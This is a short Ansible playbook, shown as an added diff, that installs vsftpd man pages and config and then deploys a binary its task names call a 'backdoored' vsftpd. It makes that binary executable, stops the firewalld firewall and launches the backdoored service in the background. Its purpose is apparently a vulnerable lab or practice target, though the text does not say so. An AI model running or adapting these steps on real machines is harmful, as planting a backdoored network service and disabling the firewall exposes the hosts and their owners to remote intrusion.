@@ -1,0 +1,46 @@
+---
+
+  - name: Creates directory for config files
+    file:
+      path: /usr/local/man/man5
+      state: directory
+
+  - name: Creates directory for config files
+    file:
+      path: /usr/local/man/man8
+      state: directory
+
+  - name: Copy over configs
+    copy:
+      src: vsftpd.8
+      dest: /usr/local/man/man8/vsftpd.8
+      owner: root
+      group: root
+
+  - name: Copy over configs
+    copy:
+      src: vsftpd.conf.5
+      dest: /usr/local/man/man5/vsftpd.conf.5
+      owner: root
+      group: root
+
+  - name: Copy main config
+    copy:
+      src: vsftpd.conf
+      dest: /etc/vsftpd.conf
+
+  - name: Copy backdoored service
+    copy:
+      src: vsftpd
+      dest: /usr/local/sbin/vsftpd
+
+  - name: Changing perm of "/usr/local/sbin/vsftpd", adding "+x"
+    file: dest=/usr/local/sbin/vsftpd mode=a+x
+
+  - name: Stop firewalld
+    service:
+      name: firewalld
+      state: stopped
+
+  - name: Start the backdoored vsftpd service
+    shell: /usr/local/sbin/vsftpd &
